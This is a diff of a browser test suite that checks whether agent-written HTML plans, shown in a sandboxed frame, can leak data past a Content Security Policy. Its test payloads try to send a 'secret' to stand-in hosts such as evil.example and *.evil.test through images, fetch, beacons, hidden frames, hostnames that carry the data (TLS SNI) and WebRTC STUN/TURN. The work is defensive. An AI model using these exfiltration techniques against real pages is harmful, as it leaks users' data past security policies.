@@ -1,14 +1,26 @@
 // A plan or artifact an agent wrote can't load anything from another host (HA-266): its frame's policy (FRAME_CSP in
 // src/components/task/htmlFrame.ts) and the board's frame-src (index.html) let it load only its own inline scripts and
-// styles, data: URLs and libraries from the CDNs. What this counts is requests: in Chromium (not Electron) a frame load
-// the policy refuses still looks the host up and connects to it (TLS SNI included), and WebRTC isn't held by the policy,
-// so a page can still send data in a hostname (HA-269).
+// styles, data: URLs and libraries from the CDNs, and WebRTC is taken away from it (noWebRtc, HA-269). What's counted
+// is connections and UDP packets, not just requests, with hostnames that carry the data mapped to a local server
+// (--host-resolver-rules). Chrome still connects for a frame load the policy refuses, unless its "Preload pages" setting
+// is off (HA-269): the checks for what reaches nothing turn it off, and one shows what it does when it's on, as the docs
+// say. A srcdoc frame the page makes itself can still use WebRTC in a browser (not in the desktop app, see
+// electron/preload.cjs): that isn't checked here.
 import assert from "node:assert/strict";
+import dgram from "node:dgram";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import http from "node:http";
+import { createRequire } from "node:module";
+import net from "node:net";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { afterAll, beforeAll, test } from "vite-plus/test";
+import { launchOptions } from "../../../../scripts/ui-check.mjs";
 import { demoProject, startServer, withBrowser } from "./harness.mjs";
 
-let server, project, plan, outside, hits;
+const { chromium } = createRequire(import.meta.url)("playwright-core");
+
+let server, project, plan, outside, hits, connections, evil, sni, udp, packets;
 beforeAll(async () => {
   server = startServer();
   project = await demoProject(server);
@@ -20,15 +32,65 @@ beforeAll(async () => {
     hits.push(req.url);
     res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" }).end("ok");
   });
+  connections = 0;
+  outside.on("connection", () => connections++);
   await new Promise((done) => outside.listen(0, "127.0.0.1", done));
+  // Where *.evil.test goes: it keeps the server name each connection's TLS ClientHello carries (SNI), or "" without one.
+  sni = [];
+  evil = net.createServer((socket) => {
+    const at = sni.push("") - 1;
+    socket.on("error", () => {});
+    socket.once("data", (d) => {
+      sni[at] = d.toString("latin1").match(/[\w.-]+\.evil\.test/)?.[0] ?? "";
+      socket.destroy();
+    });
+  });
+  await new Promise((done) => evil.listen(0, "127.0.0.1", done));
+  // A STUN server's port.
+  packets = 0;
+  udp = dgram.createSocket("udp4").on("message", () => packets++);
+  await new Promise((done) => udp.bind(0, "127.0.0.1", done));
 });
+const userDirs = [];
 afterAll(() => {
   outside?.close();
+  evil?.close();
+  udp?.close();
   server?.stop();
+  for (const dir of userDirs) rmSync(dir, { recursive: true, force: true });
 });
 
-/** What a page tries, to send `secret` out: everything here goes to `out` (the counting server) or evil.example. */
-const leaks = (out) => `
+/**
+ * A browser of its own for `withBrowser` (its `browser`, closed with the check), which sends *.evil.test to `evil`, with
+ * Chrome's "Preload pages" setting (Settings, Performance) on, as it is by default, or off.
+ */
+async function evilBrowser({ preload }) {
+  const dir = mkdtempSync(join(tmpdir(), "ia-csp-"));
+  userDirs.push(dir);
+  mkdirSync(join(dir, "Default"));
+  if (!preload) writeFileSync(join(dir, "Default", "Preferences"), JSON.stringify({ net: { network_prediction_options: 2 } }));
+  const context = await chromium.launchPersistentContext(dir, {
+    ...launchOptions(),
+    args: ["--host-resolver-rules=MAP *.evil.test 127.0.0.1"],
+    viewport: { width: 1900, height: 1000 },
+  });
+  return { newContext: async () => context };
+}
+
+/** A script that tries WebRTC: STUN to port `stun` and TURN over TCP to a host named after the data on port `turn`. */
+const webRtc = (stun, turn) => `
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stun}" }, { urls: "turn:secret-turn.evil.test:${turn}?transport=tcp", username: "secret", credential: "x" }] });
+    pc.createDataChannel("d");
+    pc.createOffer().then((o) => pc.setLocalDescription(o));
+    window.pc = pc;
+  } catch {}`;
+
+/**
+ * What a page tries, to send `secret` out: everything here goes to `out` (the counting server), evil.example, a host
+ * named after the data (`evil`'s port, as *.evil.test) or the STUN server (`stun`'s port).
+ */
+const leaks = (out, evil, stun) => `
 <p id="secret">secret</p>
 <img src="${out}/img?d=secret"><img src="https://evil.example/img?d=secret">
 <link rel="stylesheet" href="${out}/css">
@@ -43,6 +105,15 @@ const leaks = (out) => `
   navigator.sendBeacon?.("${out}/beacon", "secret");
   try { new WebSocket("${out.replace("http", "ws")}/ws"); } catch {}
   new Image().src = "${out}/late-img?d=secret";
+  // Hidden frames sent to hosts named after the data, which the policy refuses.
+  for (let i = 0; i < 3; i++) {
+    const f = document.createElement("iframe");
+    f.hidden = true;
+    document.body.append(f);
+    f.contentWindow.location.href = "https://secret" + i + ".evil.test:${evil}/";
+  }
+  window.rtc = typeof RTCPeerConnection;
+  ${webRtc(stun, evil)}
   addEventListener("load", () => {
     // A library from a CDN still loads (answered by the check's route).
     const s = document.createElement("script");
@@ -50,7 +121,13 @@ const leaks = (out) => `
     document.head.append(s);
   });
 </script>
-<ia-html><template><p>nested</p><img src="${out}/nested-img"><script>fetch("${out}/nested-fetch").catch(() => {}); parent.postMessage({ nested: "ran" }, "*");</script></template></ia-html>`;
+<iframe src="https://secret-src.evil.test:${evil}/"></iframe>
+<ia-html><template><p>nested</p><img src="${out}/nested-img"><iframe src="https://secret-nested.evil.test:${evil}/"></iframe><script>
+  fetch("${out}/nested-fetch").catch(() => {});
+  window.rtc = typeof RTCPeerConnection;
+  ${webRtc(stun, evil)}
+  parent.postMessage({ nested: "ran" }, "*");
+</script></template></ia-html>`;
 
 async function openDocument(ui, content) {
   const at = new Date().toISOString();
@@ -82,11 +159,14 @@ for (const [name, wrap] of [
   ["a plan", (body) => `<h1>Leaky plan</h1>${body}`],
   ["a whole page", (body) => `<!doctype html><html lang="en"><head><title>Leaky</title></head><body><h1>Leaky page</h1>${body}</body></html>`],
 ]) {
-  test(`${name} an agent wrote reaches no other host: no images, fetch, frames, forms or navigation; CDN libraries still load`, async () => {
+  test(`${name} an agent wrote reaches no other host: no images, fetch, frames, forms, navigation or WebRTC; CDN libraries still load`, async () => {
     hits.length = 0;
+    sni.length = 0;
+    connections = packets = 0;
     const out = `http://127.0.0.1:${outside.address().port}`;
     // The policy's refusals are console errors.
-    await withBrowser(server, { allowErrors: [/Content Security Policy|violates|Refused to|Fetch API cannot load|net::ERR_BLOCKED/] }, async (ui) => {
+    const browser = await evilBrowser({ preload: false });
+    await withBrowser(server, { browser, allowErrors: [/Content Security Policy|violates|Refused to|Fetch API cannot load|net::ERR_BLOCKED/] }, async (ui) => {
       const { page } = ui;
       const external = [];
       await page.route(/^https?:\/\//, (route) => {
@@ -96,7 +176,7 @@ for (const [name, wrap] of [
         if (url.startsWith("https://cdn.jsdelivr.net/")) return route.fulfill({ contentType: "text/javascript", body: "window.fakeLib = 'loaded'" });
         return route.fulfill({ body: "ok" });
       });
-      const frame = await openDocument(ui, wrap(leaks(out)));
+      const frame = await openDocument(ui, wrap(leaks(out, evil.address().port, udp.address().port)));
       await frame.waitForFunction(() => window.fakeLib === "loaded", null, { timeout: 10000 });
       assert.equal(await frame.evaluate(() => document.compatMode), "CSS1Compat", "the page stays in standards mode");
       if (name === "a plan") {
@@ -104,7 +184,9 @@ for (const [name, wrap] of [
         const nested = frame.childFrames().find((f) => f.url() === "about:srcdoc");
         assert.ok(nested, "the <ia-html> frame");
         await nested.waitForFunction(() => document.querySelector("p")?.textContent === "nested", null, { timeout: 5000 });
+        assert.equal(await nested.evaluate(() => window.rtc), "undefined", "the <ia-html>'s frame has no WebRTC");
       }
+      assert.equal(await frame.evaluate(() => window.rtc), "undefined", "the frame has no WebRTC");
       const blocked = await frame.evaluate(() => window.blocked);
       assert.ok(blocked.some((b) => b.startsWith("img-src")) && blocked.some((b) => b.startsWith("connect-src")), JSON.stringify(blocked));
       // Posting a form, or the frame navigating itself, to another host goes nowhere (the policy's form-action and the
@@ -113,18 +195,41 @@ for (const [name, wrap] of [
       await page.waitForTimeout(500);
       await page
         .frames()[1]
-        .evaluate((out) => (location.href = `${out}/nav?d=secret`), out)
+        .evaluate((port) => (location.href = `https://secret-nav.evil.test:${port}/nav?d=secret`), evil.address().port)
         .catch(() => {});
-      await page.waitForTimeout(1000);
+      await page.waitForTimeout(1500);
       assert.deepEqual(hits, [], `requests reached the other host (blocked: ${JSON.stringify(blocked)})`);
+      assert.equal(connections, 0, "connections reached the other host");
+      assert.deepEqual(sni, [], "connections reached hosts named after the data");
+      assert.equal(packets, 0, "WebRTC reached the STUN server");
       assert.deepEqual(
         external.filter((u) => !u.startsWith("https://cdn.jsdelivr.net/")),
         [],
         "requests left the board",
       );
+      // The board's own page has WebRTC, and it's counted: STUN packets, and TURN's connections to a host named after the data.
+      await page.evaluate(webRtc(udp.address().port, evil.address().port));
+      const deadline = Date.now() + 5000;
+      while (!(packets && sni.length) && Date.now() < deadline) await page.waitForTimeout(100);
+      assert.ok(packets && sni.length, `the board's own WebRTC went uncounted: ${packets} packets, ${sni.length} connections`);
     });
   });
 }
+
+// What the docs say (docs/guide/board.md): with "Preload pages" on, Chrome looks up and connects to the host of a frame
+// load the policy refuses, sending the data in the hostname (TLS SNI too). Should this fail because Chrome no longer
+// does, say so where the docs and FRAME_CSP's comment name it.
+test("in Chrome with Preload pages on, a frame load the policy refuses still connects to the host it names", async () => {
+  sni.length = 0;
+  const port = evil.address().port;
+  const browser = await evilBrowser({ preload: true });
+  await withBrowser(server, { browser, allowErrors: [/Content Security Policy|violates|Refused to/] }, async (ui) => {
+    await openDocument(ui, `<h1>Leaky</h1><iframe hidden src="https://secret.evil.test:${port}/"></iframe>`);
+    const deadline = Date.now() + 5000;
+    while (!sni.includes("secret.evil.test") && Date.now() < deadline) await ui.page.waitForTimeout(100);
+    assert.ok(sni.includes("secret.evil.test"), `no connection carried the hostname: ${JSON.stringify(sni)}`);
+  });
+});
 
 test("a link in a plan, or in its <ia-html>, opens in a new tab after the user's click in it, rather than in the frame", async () => {
   await withBrowser(server, {}, async (ui) => {
